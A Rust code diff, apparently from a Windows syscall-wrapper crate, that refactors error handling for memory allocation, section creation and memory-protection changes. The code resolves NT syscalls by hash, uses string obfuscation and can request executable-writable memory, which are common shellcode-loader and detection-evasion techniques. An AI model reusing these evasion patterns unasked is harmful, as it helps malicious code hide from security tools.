@@ -3,7 +3,7 @@ use crate::ntapi::def::{
     MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READWRITE, SECTION_ALL_ACCESS, SEC_COMMIT,
 };
 use crate::syscall;
-use crate::utils::{RslError, RslResult};
+use crate::utils::{NtStatusExt, RslError, RslResult};
 use core::ffi::c_void;
 use obfstr::obfstr;
 
@@ -21,7 +21,7 @@ pub fn alloc_virtual_memory_at(
     let mut region = size;
     let nt_alloc_hash = crate::dbj2_hash!(b"NtAllocateVirtualMemory");
 
-    let result = unsafe {
+    unsafe {
         syscall!(
             nt_alloc_hash,
             NtAllocateVirtualMemoryFn,
@@ -32,13 +32,10 @@ pub fn alloc_virtual_memory_at(
             (MEM_COMMIT | MEM_RESERVE) as u64,
             protection as u64
         )
-    };
-
-    match result {
-        Some(status) if status >= 0 => Ok(base_ptr as usize),
-        Some(status) => Err(RslError::NtStatus(status)),
-        None => Err(RslError::SyscallFailed(nt_alloc_hash)),
     }
+    .check(nt_alloc_hash)?;
+
+    Ok(base_ptr as usize)
 }
 
 pub fn create_section(size: usize, protection: u32) -> RslResult<isize> {
@@ -46,7 +43,7 @@ pub fn create_section(size: usize, protection: u32) -> RslResult<isize> {
     let mut max_size: i64 = size as i64;
     let nt_create_hash = crate::dbj2_hash!(b"NtCreateSection");
 
-    let create_status = unsafe {
+    unsafe {
         syscall!(
             nt_create_hash,
             NtCreateSectionFn,
@@ -58,13 +55,10 @@ pub fn create_section(size: usize, protection: u32) -> RslResult<isize> {
             SEC_COMMIT as u64,
             0isize as u64
         )
-    };
-
-    match create_status {
-        Some(status) if status >= 0 => Ok(section_handle),
-        Some(status) => Err(RslError::NtStatus(status)),
-        None => Err(RslError::SyscallFailed(nt_create_hash)),
     }
+    .check(nt_create_hash)?;
+
+    Ok(section_handle)
 }
 
 pub fn protect_virtual_memory(
@@ -78,7 +72,7 @@ pub fn protect_virtual_memory(
     let mut base_ptr = base_addr as *mut c_void;
     let mut region_size = size;
 
-    let result = unsafe {
+    unsafe {
         syscall!(
             nt_protect_hash,
             NtProtectVirtualMemoryFn,
@@ -88,13 +82,10 @@ pub fn protect_virtual_memory(
             new_prot as u64,
             (&mut old_prot as *mut u32 as u64)
         )
-    };
-
-    match result {
-        Some(status) if status >= 0 => Ok(old_prot),
-        Some(status) => Err(RslError::NtStatus(status)),
-        None => Err(RslError::SyscallFailed(nt_protect_hash)),
     }
+    .check(nt_protect_hash)?;
+
+    Ok(old_prot)
 }
 
 pub fn map_view_of_section(
